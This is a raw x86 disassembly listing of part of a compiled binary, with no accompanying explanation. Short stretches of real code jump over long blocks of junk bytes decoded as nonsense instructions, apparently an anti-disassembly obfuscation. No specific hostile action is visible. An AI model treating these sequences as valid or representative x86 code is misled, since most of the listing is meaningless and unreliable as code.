  428eae:	and    BYTE PTR [ecx+0x1a18fc1c],bl
  428eb4:	mov    edx,0x22ebbbd3
  428eb9:	lock outs dx,DWORD PTR ds:[esi]
  428ebb:	and    eax,ecx
  428ebd:	mov    DWORD PTR ds:0x433574,0x3ad6
  428ec7:	mov    cx,WORD PTR [esp+0x20]
  428ecc:	jmp    0x428fac
  428ed1:	sbb    eax,0x7c655c6d
  428ed6:	jne    0x428f15
  428ed8:	jge    0x428ef4
  428eda:	cdq    
  428edb:	jae    0x428e72
  428edd:	mov    edi,0x7c3d059
  428ee2:	in     al,0x1
  428ee4:	add    bl,al
  428ee6:	add    BYTE PTR [eax],al
  428ee8:	add    BYTE PTR [edi-0x5783a486],bh
  428eee:	ret    
  428eef:	gs ret 0xfc42
  428ef3:	nop
  428ef4:	jmp    0x428eef
  428ef6:	(bad)  
  428ef7:	jnp    0x428eba
  428ef9:	mov    al,0x93
  428efb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428efc:	pop    eax
  428efd:	pop    ds
  428efe:	pusha  
  428eff:	push   edi
  428f00:	push   ds
  428f01:	les    ebx,FWORD PTR [ecx+0x7e0594a0]
  428f07:	iret   
  428f08:	mov    ch,0x39
  428f0a:	loopne 0x428f69
  428f0c:	mov    ah,0x3e
  428f0e:	jecxz  0x428f30
  428f10:	icebp  
  428f11:	mov    dl,0xb8
  428f13:	retf   0xd4a2
  428f16:	addr16 mov dh,0x83
  428f19:	jno    0x428f5d
  428f1b:	push   ds
  428f1c:	and    eax,0x71ce1334
  428f21:	sub    ch,cl
  428f23:	xor    al,0x1c
  428f25:	hlt    
  428f26:	test   al,ah
  428f28:	sub    ah,BYTE PTR [esp+edi*2]
  428f2b:	dec    ecx
  428f2c:	lods   eax,DWORD PTR ds:[esi]
  428f2d:	add    eax,0x9709eac
  428f32:	nop
  428f33:	ja     0x428f8f
  428f35:	mov    ebx,0xd7f55d6c
  428f3a:	stos   BYTE PTR es:[edi],al
  428f3b:	fimul  WORD PTR [ebx]
  428f3d:	repz pop eax
  428f3f:	xor    dh,BYTE PTR [eax+0x4f47c683]
  428f45:	mov    edx,ebp
  428f47:	adc    DWORD PTR [esi-0x65],edi
  428f4a:	inc    ebx
  428f4b:	icebp  
  428f4c:	or     BYTE PTR [eax],cl
  428f4e:	adc    ah,BYTE PTR [ebp+edi*4-0x40]
  428f52:	and    BYTE PTR [ebx+ebp*4+0x12],0x1
  428f57:	enter  0x35a0,0xbe
  428f5b:	inc    eax
  428f5c:	inc    ebp
  428f5d:	rcl    DWORD PTR [ebp-0x20],cl
  428f60:	or     al,0x55
  428f62:	pushf  
  428f63:	ja     0x428f1c
  428f65:	nop
  428f66:	ss adc eax,0xde9242d6
  428f6c:	pop    ecx
  428f6d:	cmp    al,0x87
  428f6f:	push   cs
  428f70:	cmc    
  428f71:	xchg   ebx,eax
  428f72:	xlat   BYTE PTR ds:[ebx]
  428f73:	cwde   
  428f74:	sub    ecx,ecx
  428f76:	push   eax
  428f77:	fbld   TBYTE PTR [ebx+0x3b]
  428f7a:	and    bl,BYTE PTR [esi]
  428f7c:	and    BYTE PTR [edi+0x1ba8eed2],0x93
  428f83:	cld    
  428f84:	cli    
  428f85:	mov    ds:0xb00127e1,eax
  428f8a:	dec    esi
  428f8b:	jno    0x428f92
  428f8d:	sbb    ch,BYTE PTR [eax-0x9ffb180]
  428f93:	daa    
  428f94:	std    
  428f95:	cmp    al,0xb
  428f97:	mov    ch,0x60
  428f99:	je     0x428f48
  428f9b:	lods   al,BYTE PTR ds:[esi]
  428f9c:	ins    DWORD PTR es:[edi],dx
  428f9d:	sub    ebx,DWORD PTR [ecx]
  428f9f:	mov    esp,0x5e0f887f
  428fa4:	dec    edx
  428fa5:	sub    eax,DWORD PTR [ebx+0x19]
  428fa8:	xchg   BYTE PTR [esi-0x48f05b6c],ah
  428fae:	leave  
  428faf:	mov    DWORD PTR ds:0x4335bc,0x2457
  428fb9:	cmp    eax,ecx
  428fbb:	jg     0x42d682
  428fc1:	mov    DWORD PTR [esp+0x30],0x6ae6
  428fc9:	jmp    0x4290a9
  428fce:	push   esp
  428fcf:	int    0xe1
  428fd1:	dec    edi
  428fd2:	stc    
  428fd3:	outs   dx,DWORD PTR ds:[esi]
  428fd4:	(bad)  
  428fd5:	fild   QWORD PTR [esi+0x8]
  428fd8:	mov    ds:0x7512493f,al
  428fdd:	mov    eax,ds:0x1e4ca
  428fe2:	ret    
  428fe3:	add    BYTE PTR [eax],al
  428fe5:	add    BYTE PTR [edx+0x6ba342d4],ah
  428feb:	mov    bl,0xc0
  428fed:	dec    ebp
  428fee:	xchg   esp,eax
  428fef:	mov    ah,0x89
  428ff1:	clc    
  428ff2:	outs   dx,DWORD PTR ds:[esi]
  428ff3:	cmp    DWORD PTR [edx-0x33],esp
  428ff6:	jg     0x428fc6
  428ff8:	imul   ebp,edi,0x42
  428ffb:	jns    0x429034
  428ffd:	(bad)  
  428ffe:	fs inc ecx
  429000:	xchg   ebx,eax
  429001:	repz test al,0xdb
  429004:	fs cwd 
  429007:	shl    ebp,0x2e
  42900a:	(bad)  
  42900b:	or     al,BYTE PTR [edx]
  42900d:	xor    BYTE PTR [ebx+0x55ff58dd],al
  429013:	setge  BYTE PTR gs:[ebp+edx*1-0x2f6be220]
  42901c:	mov    edx,DWORD PTR [esi+edi*1+0x7]
  429020:	xchg   esi,eax
  429021:	sbb    BYTE PTR [ecx+0x229f97be],cl
  429027:	imul   eax,DWORD PTR [edx],0xfaa8aad0
  42902d:	outs   dx,DWORD PTR ds:[esi]
  42902e:	adc    dl,BYTE PTR [eax]
  429030:	jmp    0x842f:0x21196c0b
  429037:	and    eax,ebx
  429039:	mov    cl,0xd0
  42903b:	lahf   
  42903c:	std    
  42903d:	cwde   
  42903e:	mov    eax,ds:0x1262087f
  429043:	fdiv   DWORD PTR [ecx]
  429045:	neg    DWORD PTR [edx-0x52117ff]
  42904b:	inc    ebp
  42904c:	xlat   BYTE PTR ds:[ebx]
  42904d:	cld    
  42904e:	add    edi,esp
  429050:	xchg   edi,eax
  429051:	shl    BYTE PTR [ebx-0xd],1
  429054:	es (bad) 
  429056:	dec    ebx
  429057:	fistp  QWORD PTR [esi]
  429059:	sub    al,0xa7
  42905b:	adc    eax,0x432f0f8a
  429060:	inc    ecx
  429061:	cwde   
  429062:	ins    BYTE PTR es:[edi],dx
  429063:	jo     0x4290ba
  429065:	aaa    
  429066:	inc    edi
  429067:	xchg   ecx,eax
  429068:	add    eax,0xcac83158
  42906d:	dec    edi
  42906e:	ins    BYTE PTR es:[edi],dx
  42906f:	xchg   edi,ecx
  429071:	inc    esp
  429072:	fild   WORD PTR [ebp-0x1e09c45b]
  429078:	imul   edi,DWORD PTR [eax+ebx*1+0x16],0xffffffa1
  42907d:	mov    ds:0xe4cabdfb,eax
  429082:	adc    edi,DWORD PTR [edx-0x3e]
  429085:	mov    eax,0xf7897c43
  42908a:	aaa    
  42908b:	push   0x7d188408
  429090:	js     0x4290b9
  429092:	out    dx,eax
  429093:	dec    eax
  429094:	inc    ecx
  429095:	rcl    DWORD PTR [ebx],cl
  429097:	sub    al,0x4e
  429099:	or     DWORD PTR [eax-0x5705d98c],ebx
  42909f:	shr    BYTE PTR [ecx],cl
  4290a1:	outs   dx,BYTE PTR ds:[esi]
  4290a2:	inc    esp
  4290a3:	push   ss
  4290a4:	inc    ebx
  4290a5:	icebp  
  4290a6:	aam    0x92
  4290a8:	pop    ss
  4290a9:	mov    DWORD PTR [esp+0x34],0x150b
  4290b1:	jmp    0x429191
  4290b6:	sbb    BYTE PTR [esp+eiz*8-0x62861397],dh
  4290bd:	cmc    
  4290be:	jae    0x4290e2
  4290c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290c1:	les    ebp,FWORD PTR [ecx+esi*8-0x1a726a90]
  4290c8:	add    DWORD PTR [eax],eax
  4290ca:	ret    
  4290cb:	add    BYTE PTR [eax],al
  4290cd:	add    BYTE PTR [ecx+0x32],ch
  4290d0:	fiadd  DWORD PTR [ecx]
  4290d2:	ins    BYTE PTR es:[edi],dx
  4290d3:	sub    BYTE PTR [eax-0x37],al
  4290d6:	call   0x8bcff2f4
  4290db:	add    eax,0xc3508b07
  4290e0:	inc    eax
  4290e1:	ds (bad) 
  4290e4:	xchg   edx,eax
  4290e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290e6:	pop    edi
  4290e7:	shl    cl,1
  4290e9:	lods   eax,DWORD PTR ds:[esi]
  4290ea:	addr16 inc eax
  4290ec:	push   0xfffffff1
  4290ee:	sub    dl,bl
  4290f0:	ret    
  4290f1:	and    dl,ch
  4290f3:	xchg   ebx,eax
  4290f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290f5:	or     bl,bl
  4290f7:	jae    0x429178
  4290f9:	lods   al,BYTE PTR ds:[esi]
  4290fa:	add    al,0xec
  4290fc:	out    dx,eax
  4290fd:	in     eax,dx
  4290fe:	imul   edx,DWORD PTR [ebx*2-0xc85e71a],0xfffffff4
  429106:	sub    al,0xc0
  429108:	shl    ch,cl
  42910a:	and    esp,eax
  42910c:	leave  
  42910d:	pop    esp
  42910e:	push   edi
  42910f:	and    eax,0xa3910877
  429114:	imul   eax,DWORD PTR [edx+0x2cf180bc],0xba9fc79b
  42911e:	lods   eax,DWORD PTR ds:[esi]
  42911f:	sub    al,0x23
  429121:	jae    0x429170
  429123:	sbb    ebp,ebp
  429125:	pop    edi
  429126:	call   0xa6ad6cc2
  42912b:	and    al,0x53
  42912d:	sahf   
  42912e:	inc    edi
  42912f:	jo     0x4290d4
  429131:	jns    0x429137
  429133:	ret    
  429134:	cmp    bh,ah
  429136:	mov    ebp,0x759289a
  42913b:	mov    esi,0x1d72504b
  429140:	mov    ch,BYTE PTR [ebp-0x239241d6]
  429146:	push   ds
  429147:	mov    bl,0x2f
  429149:	mov    ah,0x17
  42914b:	sub    BYTE PTR [edx-0x139446be],bl
  429151:	jmp    0x43e5d3cc
  429156:	pop    ss
  429157:	cdq    
  429158:	mov    ecx,0xcf29d764
  42915d:	lods   eax,DWORD PTR ds:[esi]
  42915e:	(bad)  
  42915f:	push   cs
  429160:	mov    eax,ds:0x6026ae3b
  429165:	(bad)  
  429166:	leave  
  429167:	cmp    eax,0x9acd6395
  42916c:	ficomp WORD PTR ds:0x137d35cd
  429172:	jno    0x4291a9
  429174:	jno    0x429113
  429176:	lods   al,BYTE PTR ds:[esi]
  429177:	aad    0xa5
  429179:	push   ebp
  42917a:	(bad)  
  42917c:	nop
  42917d:	test   DWORD PTR [edx+0x48be050f],ecx
  429183:	leave  
  429184:	add    DWORD PTR [esi+0x3f],esi
  429187:	push   ebp
  429188:	jecxz  0x429157
  42918a:	test   al,0x3
  42918c:	retf   
  42918d:	les    esp,FWORD PTR [eax-0x73]
  429190:	dec    esp
  429191:	mov    DWORD PTR [esp+0x28],0x14011c5e
  429199:	add    eax,ecx
  42919b:	mov    DWORD PTR [esp+0x2c],0x0
  4291a3:	adc    DWORD PTR ds:0x433590,0x433670
  4291ad:	mov    DWORD PTR [esp+0x20],0x9a5
  4291b5:	jmp    0x429295
  4291ba:	imul   esp,DWORD PTR [esi-0x13001fe],0x654ab7fd
  4291c4:	retf   0x208f
  4291c7:	test   al,0xf3
  4291c9:	mov    eax,ds:0x1e650
  4291ce:	ret    
  4291cf:	add    BYTE PTR [eax],al
  4291d1:	add    BYTE PTR [edi],al
  4291d3:	ins    DWORD PTR es:[edi],dx
  4291d4:	or     edx,DWORD PTR [ebx-0x5a1d1a55]
  4291da:	sar    BYTE PTR [ebx-0x4c4282a1],cl
  4291e0:	sub    ah,BYTE PTR [edi+0x39]
  4291e3:	lsl    ecx,bp
  4291e6:	int    0xf
  4291e8:	or     al,0x52
  4291ea:	sti    
  4291eb:	and    edx,esi
  4291ed:	xchg   ecx,eax
  4291ee:	call   DWORD PTR [ebx-0x65]
  4291f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4291f2:	push   esi
  4291f3:	int    0xd1
  4291f5:	ffree  st(7)
  4291f7:	in     eax,0x7f
  4291f9:	lahf   
  4291fa:	sahf   
  4291fb:	and    DWORD PTR [ecx-0x73],edi
  4291fe:	(bad)  
  4291ff:	and    esi,esi
  429201:	fs test al,0x84
  429204:	mov    eax,0x72673471
  429209:	inc    edx
  42920a:	in     eax,0xc7
  42920c:	js     0x42924e
  42920e:	xchg   esp,eax
  42920f:	inc    edi
  429210:	mov    cl,0x83
  429212:	imul   esi,DWORD PTR [ebx-0x1b],0xd5842e92
  429219:	(bad)  [esi]
  42921b:	pop    ecx
  42921c:	popf   
  42921d:	mov    eax,0xfbd5e6b4
  429222:	stos   BYTE PTR es:[edi],al
  429223:	(bad)  
  429224:	cli    
  429225:	dec    esi
  429226:	inc    edx
  429227:	push   es
  429228:	lods   eax,DWORD PTR ds:[esi]
  429229:	jmp    0xd7c4:0xfdc1898d
  429230:	sub    eax,0xebc29de5
  429235:	and    eax,0xe127df01
  42923a:	call   0x8c0d:0x7f4015e7
  429241:	jge    0x429295
  429243:	fs retf 
  429245:	adc    ebx,0x57d8bdb4
  42924b:	dec    edx
  42924c:	lahf   
  42924d:	cmc    
  42924e:	push   edx
  42924f:	mov    ch,0x56
  429251:	ficom  DWORD PTR [esi-0x67]
  429254:	cmp    DWORD PTR [ebp-0x9d890d9],esp
  42925a:	shl    ah,0x12
  42925d:	loop   0x42926d
  42925f:	imul   eax,edx,0xe25fa485
  429265:	and    al,0xbf
  429267:	out    0x3c,al
  429269:	outs   dx,DWORD PTR ds:[esi]
  42926a:	mov    WORD PTR [eax+0x65e8c931],?
  429270:	push   ebx
  429271:	nop
  429272:	ins    BYTE PTR es:[edi],dx
  429273:	mov    dh,0x19
  429275:	fild   DWORD PTR [ecx-0x7f]
  429278:	fisttp WORD PTR [edi+0x6eeac8d]
  42927e:	xchg   DWORD PTR [ebx],ecx
  429280:	cmp    al,0x5f
  429282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429283:	(bad)  
  429285:	jne    0x4292e1
  429287:	xchg   esi,eax
  429288:	sbb    eax,0x6bae9479
  42928d:	lods   eax,DWORD PTR ds:[esi]
  42928e:	mov    ds:0x484d2fb,al
  429293:	clc    
  429294:	fld    st(7)
  429296:	inc    esp
  429297:	and    al,0x24
  429299:	or     al,0x2f
  42929b:	add    BYTE PTR [eax],al
  42929d:	mov    DWORD PTR [esp+0x18],0x7b8c
  4292a5:	cmp    DWORD PTR ds:0x43363c,0x0
  4292ac:	jg     0x4292c7
  4292b2:	jmp    0x4292c7
  4292b7:	push   0x7ec1
  4292bc:	push   0x16a7
  4292c1:	call   DWORD PTR ds:0x43c7c4
  4292c7:	mov    DWORD PTR [esp+0x1c],0x28ed
  4292cf:	mov    eax,DWORD PTR [esp+0x18]
  4292d3:	mov    ecx,DWORD PTR [esp+0x1c]
  4292d7:	mov    edx,DWORD PTR [esp+0x20]
  4292db:	jmp    0x4293bb
  4292e0:	and    BYTE PTR [ebx-0x8],bh
  4292e3:	lahf   
  4292e4:	sti    
  4292e5:	lahf   
  4292e6:	call   FWORD PTR [si-0x4d]
  4292ea:	stos   BYTE PTR es:[edi],al
  4292eb:	in     al,0x2a
  4292ed:	cwde   
  4292ee:	test   BYTE PTR [edi],0x13
  4292f1:	out    0x1,eax
  4292f3:	add    bl,al
  4292f5:	add    BYTE PTR [eax],al
  4292f7:	add    BYTE PTR ds:0x28586489,ch
  4292fd:	push   edx
  4292fe:	popa   
  4292ff:	jo     0x429365
  429301:	fadd   QWORD PTR [edx]
  429303:	adc    DWORD PTR [ebx+0x67],ebx
  429306:	cmp    ecx,DWORD PTR [ebp+0x60b1edb7]
  42930c:	xchg   ecx,eax
  42930d:	scas   al,BYTE PTR es:[edi]
  42930e:	push   0x6921d828
  429313:	les    edi,FWORD PTR [ebp+0x3fca6575]
  429319:	aad    0x12
  42931b:	xchg   BYTE PTR [ebx-0x1],cl
  42931e:	cli    
  42931f:	pop    ebp
  429320:	les    ebx,FWORD PTR [edi+ecx*1+0x7d545af6]
  429327:	push   edx
  429328:	in     eax,dx
  429329:	push   0xae1a7a3f
  42932e:	(bad)  [ecx-0x1f1cf2e1]
  429334:	jecxz  0x42936e
  429336:	add    dl,BYTE PTR [esi+0x39]
  429339:	lds    edi,FWORD PTR [ecx+0x142376b]
  42933f:	fbld   TBYTE PTR [eax]
  429341:	jge    0x4292e6
  429343:	fild   DWORD PTR [edx-0x33bffa30]
  429349:	mov    ds:0x7bfc5bd5,al
  42934e:	add    ebx,DWORD PTR [esi+0x220fe426]
  429354:	aad    0xa4
  429356:	ins    DWORD PTR es:[edi],dx
  429357:	jo     0x429320
  429359:	repz shl BYTE PTR ds:0xf1e40b51,cl
  429360:	cmp    DWORD PTR [ebp-0x56b9adae],ebx
  429366:	stos   DWORD PTR es:[edi],eax
  429367:	and    DWORD PTR [ebx],ecx
  429369:	repz or DWORD PTR [edx+ebp*1],ebp
  42936d:	std    
  42936e:	int3   
  42936f:	or     esp,0xfffffff2
  429372:	cmp    ebp,DWORD PTR [edi+0x239241bb]
  429378:	daa    
  429379:	loopne 0x4293f1
  42937b:	sahf   
  42937c:	clc    
  42937d:	ja     0x429342
  42937f:	sbb    ecx,ecx
  429381:	dec    esi
  429382:	adc    al,0xa3
  429384:	fldenv [edx-0x6f7d0f85]
  42938a:	inc    edx
  42938b:	or     DWORD PTR [ecx-0x72],esi
  42938e:	jne    0x4293e5
  429390:	addr16 mov ds:0x889d,eax
  429394:	ret    
  429395:	neg    DWORD PTR [ebp-0x78]
  429398:	jnp    0x429328
  42939a:	jno    0x42932d
  42939c:	sbb    DWORD PTR [esi+0x76b53df4],ebp
  4293a2:	cld    
  4293a3:	cmc    
  4293a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4293a5:	scas   eax,DWORD PTR es:[edi]
  4293a6:	ret    0x693b
  4293a9:	cmp    eax,0xe1654bad
  4293ae:	enter  0x2739,0x9c
  4293b2:	jne    0x429356
  4293b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4293b5:	mov    cl,0xaf
  4293b7:	cmp    dh,BYTE PTR es:[edi+0x42]
  4293bb:	mov    ebx,DWORD PTR [esp+0x24]
  4293bf:	xor    eax,edx
  4293c1:	mov    edx,DWORD PTR [esp+0x28]
  4293c5:	adc    DWORD PTR ds:0x4335d0,0x7b97
  4293cf:	xor    ecx,ebx
  4293d1:	or     DWORD PTR ds:0x433608,ebx
  4293d7:	mov    ebx,DWORD PTR [esp+0x2c]
  4293db:	or     DWORD PTR ds:0x4335ac,0x433608
  4293e5:	push   ebx
  4293e6:	push   edx
  4293e7:	dec    DWORD PTR ds:0x433624
  4293ed:	push   ecx
  4293ee:	push   eax
  4293ef:	adc    DWORD PTR ds:0x433560,0x433548
  4293f9:	call   0x423dad
  4293fe:	add    DWORD PTR ds:0x43363c,0x32db
  429408:	mov    ecx,DWORD PTR [esp+0x30]
  42940c:	sub    DWORD PTR ds:0x433638,0x2b17
  429416:	mov    ebx,DWORD PTR [esp+0x34]
  42941a:	xor    eax,ecx
  42941c:	cmp    DWORD PTR ds:0x4335e4,0x0
  429423:	jge    0x429526
  429429:	mov    DWORD PTR ds:0x433650,0x7bb8
  429433:	jmp    0x429526
  429438:	push   0x4335c8
  42943d:	push   DWORD PTR [ebp-0x20]
  429440:	call   DWORD PTR ds:0x43c804
  429446:	jmp    0x429526
  42944b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42944c:	js     0x42944b
  42944e:	inc    ebx
  42944f:	inc    edi
  429451:	mov    edi,0xa77a83fc
  429456:	or     eax,0x33760ec6
  42945b:	(bad)  
  42945c:	out    0x1,eax
  42945e:	add    bl,al
  429460:	add    BYTE PTR [eax],al
  429462:	add    BYTE PTR [esi-0xe625f63],ch
  429468:	fstp   QWORD PTR [esi]
  42946a:	imul   ebx,DWORD PTR [ecx-0x6ca2e706],0xffffff8e
  429471:	stos   BYTE PTR es:[edi],al
  429472:	pop    es
  429473:	fnstcw WORD PTR [eax-0x5a6f93e1]
  429479:	lahf   
  42947a:	push   edi
  42947b:	shr    DWORD PTR [eax-0x3e38fc8a],cl
  429481:	inc    esp
  429482:	push   ds
  429483:	dec    eax
  429484:	nop
  429485:	pop    ebp
  429486:	adc    BYTE PTR [edx-0x2d],dh
  429489:	and    al,0x39
  42948b:	fs mov ebx,0x6607fe43
  429491:	in     eax,dx
  429492:	xor    eax,0xe26de91e
  429497:	dec    ebx
  429498:	jno    0x429485
  42949a:	xor    edx,ebx
  42949c:	xor    DWORD PTR [ebx+0x45eb06b4],ebx
  4294a2:	addr16 pop esp
  4294a4:	lock out 0xa5,eax
  4294a7:	add    eax,0xb827f171
  4294ac:	imul   DWORD PTR [ebp+0x5b02fcfe]
  4294b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4294b3:	shr    DWORD PTR [ebp-0x262cb600],0xdf
  4294ba:	(bad)  
  4294bb:	imul   BYTE PTR [eax]
  4294bd:	inc    edi
  4294be:	bound  ecx,QWORD PTR [esi+0x4a]
  4294c1:	mov    al,ds:0xf9016b1
  4294c6:	aas    
  4294c7:	add    DWORD PTR [ecx],edi
  4294c9:	aaa    
  4294ca:	or     bl,BYTE PTR [edx]
  4294cc:	sbb    edi,DWORD PTR [edi+0x1f]
  4294cf:	inc    esi
  4294d0:	push   esi
  4294d1:	test   DWORD PTR [ecx-0xc72fd19],edx
  4294d7:	jle    0x429504
  4294d9:	push   cs
  4294da:	rep lods al,BYTE PTR ds:[esi]
  4294dc:	xor    eax,0xa4e591f4
  4294e1:	mov    edx,0x9db7a6ef
  4294e6:	aam    0xd0
  4294e8:	out    dx,eax
  4294e9:	sub    al,0x58
  4294eb:	jge    0x429485
  4294ed:	outs   dx,BYTE PTR ds:[esi]
  4294ee:	and    al,BYTE PTR [eax]
  4294f0:	jp     0x4294e8
  4294f2:	mov    cl,0xc7
  4294f4:	jae    0x4294df
  4294f6:	inc    ecx
  4294f7:	mov    ecx,0xd399b69c
  4294fc:	mov    al,0x9f
  4294fe:	and    edx,ebp
  429500:	call   FWORD PTR [esi]
  429502:	hlt    
  429503:	fdiv   QWORD PTR [ebx+0x74673902]
  429509:	lods   eax,DWORD PTR ds:[esi]
  42950a:	je     0x4294aa
  42950c:	shlx   ebp,DWORD PTR [edi],esp
  429511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429512:	jbe    0x429523
  429514:	dec    ecx
  429515:	mov    bh,bh
  429517:	(bad)  
  429518:	push   ebp
  429519:	pop    ecx
  42951a:	push   ecx
  42951b:	mov    cl,al
  42951d:	jb     0x429560
  42951f:	sbb    esp,DWORD PTR [edi]
  429521:	xlat   BYTE PTR ds:[ebx]
  429522:	stc    
  429523:	lods   eax,DWORD PTR ds:[esi]
  429524:	call   0x691c:0x25d333fb
  42952b:	add    BYTE PTR [eax],al
  42952d:	mov    DWORD PTR [esp+0x30],eax
  429531:	and    edx,0x3f03
  429537:	jmp    0x429617
  42953c:	pop    eax
  42953d:	mov    gs,esp
  42953f:	sar    dh,1
  429541:	bnd jl 0x4294d2
  429544:	rcr    BYTE PTR [eax-0x5c34cce9],cl
  42954a:	fnsave [eax-0x67]
  42954d:	call   0x1059553
  429552:	add    BYTE PTR [eax],al
  429554:	sbb    eax,0x8955008b
  429559:	fnstsw WORD PTR [edi-0x21]
  42955c:	or     DWORD PTR [ebx+0x15],0x711651f8
  429563:	push   ds
  429564:	std    
  429565:	cli    
  429566:	push   ss
  429567:	test   eax,0xdc4e7b76
  42956c:	inc    edx
  42956d:	div    DWORD PTR [edx]
  42956f:	adc    DWORD PTR [edx],eax
  429571:	pop    es
  429572:	xchg   edi,eax
  429573:	sti    
  429574:	pushf  
  429575:	jns    0x42957f
  429577:	in     eax,0x11
  429579:	loopne 0x4295cd
  42957b:	and    eax,esp
  42957d:	cdq    
  42957e:	dec    eax
  42957f:	xchg   ebp,eax
  429580:	fcomp  st(0)
  429582:	ss pop edx
  429584:	addr16 jne 0x42951b
  429587:	lods   eax,DWORD PTR ds:[esi]
  429588:	iret   
  429589:	push   ecx
  42958a:	fidiv  DWORD PTR [eax-0x28]
  42958d:	je     0x42953e
  42958f:	call   0x58e85e55
  429594:	inc    ecx
  429595:	cmp    al,0x3f
  429597:	push   ecx
  429598:	xor    BYTE PTR [esi+0x4caf7bdd],0x1f
  42959f:	dec    ebx
  4295a0:	fwait
  4295a1:	jbe    0x4295ba
  4295a3:	and    al,0x79
  4295a5:	dec    esi
  4295a6:	(bad)  
  4295a7:	fistp  WORD PTR [esi]
  4295a9:	fnsave [ebx+0x2a014ce3]
  4295af:	dec    ebp
  4295b0:	in     eax,0x2b
  4295b2:	stos   DWORD PTR es:[edi],eax
  4295b3:	call   0x7d0e:0x4831b6d2
  4295ba:	mov    ds:0x6684253e,eax
  4295bf:	std    
  4295c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295c1:	dec    edx
  4295c2:	mov    eax,0xa8e280fb
  4295c7:	xchg   ebx,eax
  4295c8:	retf   
  4295c9:	inc    ecx
  4295ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295cb:	pop    ss
  4295cc:	and    DWORD PTR [ecx],eax
  4295ce:	scas   eax,DWORD PTR es:[edi]
  4295cf:	scas   eax,DWORD PTR es:[edi]
  4295d0:	pop    es
  4295d1:	mov    ebp,0x2ecd5dde
  4295d6:	call   0x37ab:0x875950bf
  4295dd:	mov    bh,0x50
  4295df:	lods   eax,DWORD PTR ds:[esi]
  4295e0:	retf   0x825b
  4295e3:	nop
  4295e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295e5:	icebp  
  4295e6:	mov    edi,0xaaa4791c
  4295eb:	out    0x98,al
  4295ed:	pop    ebx
  4295ee:	xor    dl,BYTE PTR [esi-0x77]
  4295f1:	aaa    
  4295f2:	into   
  4295f3:	mov    WORD PTR [ecx+ebp*2+0x4f],?
  4295f7:	or     eax,0xa41d67a3
  4295fc:	or     BYTE PTR [esi+0x2e8c4a7b],al
  429602:	cmp    esi,DWORD PTR [esp+eax*1]
  429605:	scas   al,BYTE PTR es:[edi]
  429606:	bsr    ebx,DWORD PTR [ebp-0x6e881575]
  42960d:	mov    ds:0x7a22693b,eax
  429612:	sub    eax,0x370ededd
  429617:	mov    DWORD PTR [esp+0x34],edx
  42961b:	mov    DWORD PTR [esp+0x28],0x811
  429623:	mov    eax,ds:0x43369c
  429628:	mov    ecx,DWORD PTR ds:0x4336dc
  42962e:	sub    eax,ecx
  429630:	and    eax,DWORD PTR [eax+ecx*1]
  429633:	jmp    0x429713
  429638:	outs   dx,BYTE PTR ds:[esi]
  429639:	js     0x429669
  42963b:	cmc    
  42963c:	ds idiv edi
  42963f:	sti    
  429640:	mov    esp,0xff0d90dc
  429645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429646:	daa    
  429647:	mov    ebx,0x1e95c
  42964c:	ret    
  42964d:	add    BYTE PTR [eax],al
  42964f:	add    bl,cl
  429651:	pop    ebx
  429652:	mov    bh,0xb1
  429654:	lds    edi,FWORD PTR [ebx]
  429656:	inc    esi
  429657:	adc    ecx,DWORD PTR [edx-0x70]
  42965a:	(bad)  
  42965b:	sti    
  42965c:	xchg   edi,eax
  42965d:	dec    edx
  42965e:	sub    BYTE PTR [ebp+0x65],al
  429661:	adc    eax,esi
  429663:	jl     0x429630
  429665:	mov    ch,0xae
  429667:	daa    
  429668:	jo     0x42964f
  42966a:	das    
  42966b:	cmp    DWORD PTR [edi+ebp*4],0x64d71aa2
  429672:	repnz or ebx,DWORD PTR [ebp+ecx*1+0x20]
  429677:	arpl   WORD PTR [eax+ebp*4],si
  42967a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42967b:	lahf   
  42967c:	jb     0x429671
  42967e:	xchg   ebx,eax
  42967f:	push   ecx
  429680:	xor    eax,0x4cc3f75d
  429685:	mov    DWORD PTR [edi],0x3d493be0
  42968b:	sub    ebp,edx
  42968d:	push   0xffffffea
  42968f:	dec    ebx
  429690:	jle    0x42961e
  429692:	pop    ebp
  429693:	pop    esp
  429694:	and    eax,0x9912cbef
  429699:	mov    DWORD PTR [edx],edi
  42969b:	sbb    ch,BYTE PTR [ebx]
  42969d:	lock add ebp,eax
  4296a0:	mov    fs,WORD PTR [eax-0x7e6e72f4]
  4296a6:	cdq    
  4296a7:	push   ecx
  4296a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296a9:	iret   
  4296aa:	loop   0x4296c3
  4296ac:	inc    ebp
  4296ad:	and    BYTE PTR [eax+0x25],0xd5
  4296b1:	add    dl,BYTE PTR [ecx-0x3d39e68e]
  4296b7:	add    BYTE PTR [ebp-0x500e3bf3],al
  4296bd:	pop    ss
  4296be:	push   ebx
  4296bf:	xchg   edx,eax
  4296c0:	ins    DWORD PTR es:[edi],dx
  4296c1:	in     eax,0x47
  4296c3:	in     eax,0x1e
  4296c5:	pop    eax
  4296c6:	jecxz  0x42972c
  4296c8:	in     al,dx
  4296c9:	and    al,0xe5
  4296cb:	shr    esp,1
  4296cd:	dec    esi
  4296ce:	xchg   esp,eax
  4296cf:	jle    0x42966d
  4296d1:	and    DWORD PTR [eax+0x4e98ae32],esi
  4296d7:	cdq    
  4296d8:	add    BYTE PTR [edx+0x97aad04],dh
  4296de:	mov    esi,0x4712f56f
  4296e3:	sti    
  4296e4:	mov    ebp,0x9b727074
  4296e9:	dec    ecx
  4296ea:	outs   dx,DWORD PTR ds:[esi]
  4296eb:	sub    al,0xed
  4296ed:	push   edx
